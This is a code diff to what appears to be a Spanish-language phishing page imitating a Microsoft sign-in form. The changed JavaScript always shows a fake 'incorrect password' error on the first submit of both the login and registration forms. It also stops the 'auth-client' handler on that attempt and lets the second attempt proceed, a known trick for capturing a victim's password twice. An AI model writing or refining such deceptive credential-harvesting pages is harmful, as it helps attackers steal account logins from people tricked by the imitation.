@@ -91,9 +91,7 @@
     .field-wrap input:focus { border-bottom: 2px solid #0067b8; }
     .field-wrap input::placeholder { color: #666; }
 
-    /* ===== NUEVO: borde rojo en el input cuando hay error ===== */
     .field-wrap input.input-error { border-bottom: 2px solid #e81123; }
-    /* ===== FIN NUEVO ===== */
 
     .ms-title { font-size: 24px; font-weight: 600; color: #1b1b1b; margin: 16px 0 12px 0; }
     .ms-info { font-size: 13px; margin-bottom: 16px; color: #1b1b1b; }
@@ -216,11 +214,9 @@
                 </div>
                 <div class="ms-info"><a href="#">¿Has olvidado tu contraseña?</a></div>
 
-                <!-- ===== NUEVO: mensaje de error del primer intento (registro) ===== -->
                 <p class="notice" id="reg-error" role="alert" aria-live="assertive" hidden>
                   Contraseña incorrecta. Vuelve a intentarlo.
                 </p>
-                <!-- ===== FIN NUEVO ===== -->
 
                 <button class="primary-button" type="submit">Iniciar sesión</button>
               </div>
@@ -248,11 +244,9 @@
                 </div>
                 <div class="ms-info"><a href="#">¿Has olvidado tu contraseña?</a></div>
 
-                <!-- ===== NUEVO: mensaje de error del primer intento (login) ===== -->
                 <p class="notice" id="login-error" role="alert" aria-live="assertive" hidden>
                   Contraseña incorrecta. Vuelve a intentarlo.
                 </p>
-                <!-- ===== FIN NUEVO ===== -->
 
                 <button class="primary-button" type="submit">Iniciar sesión</button>
               </div>
@@ -312,9 +306,7 @@
 
       document.body.classList.remove('registro-step2');
 
-      // ===== NUEVO: reiniciar el contador de intentos al volver =====
       resetRegError();
-      // ===== FIN NUEVO =====
     }
 
     // Control del flujo de dos pasos para LOGIN
@@ -338,9 +330,7 @@
       document.getElementById('back-arrow').classList.remove('active');
       document.getElementById('switch-btn-container').style.display = 'block';
 
-      // ===== NUEVO: reiniciar el contador de intentos al volver =====
       resetLoginError();
-      // ===== FIN NUEVO =====
     }
 
     function goBack() {
@@ -382,7 +372,7 @@
     }
 
     // =========================================================
-    // ===== NUEVO: FALLO EN EL PRIMER INTENTO Y ÉXITO EN EL 2 =====
+    // ===== FALLO EN EL PRIMER INTENTO Y ÉXITO EN EL 2 =====
     // =========================================================
     let regIntentos = 0;
     let loginIntentos = 0;
@@ -403,14 +393,16 @@
       input.classList.remove('input-error');
     }
 
-    // Registro: primer submit -> error, segundo submit -> continúa
+    // Registro: primer submit -> solo error (frena el envío y a auth-client).
+    // Segundo submit -> no se frena nada, auth-client sigue igual que siempre.
     document.getElementById('form-registro').addEventListener('submit', function (e) {
       const err = document.getElementById('reg-error');
       const input = document.getElementById('registro-usuario');
 
       if (regIntentos === 0) {
-        e.preventDefault();          // bloquea el primer intento
         regIntentos++;
+        e.preventDefault();
+        e.stopImmediatePropagation();   // <- impide que auth-client entre en el 1er intento
         err.hidden = false;
         input.classList.add('input-error');
         input.focus();
@@ -418,19 +410,19 @@
         return;
       }
 
-      // Segundo intento en adelante: sin error, el flujo sigue normal
       err.hidden = true;
       input.classList.remove('input-error');
     });
 
-    // Login: mismo comportamiento (primer intento falla, segundo funciona)
+    // Login: mismo comportamiento
     document.getElementById('form-entrada').addEventListener('submit', function (e) {
       const err = document.getElementById('login-error');
       const input = document.getElementById('login-password');
 
       if (loginIntentos === 0) {
-        e.preventDefault();
         loginIntentos++;
+        e.preventDefault();
+        e.stopImmediatePropagation();
         err.hidden = false;
         input.classList.add('input-error');
         input.focus();
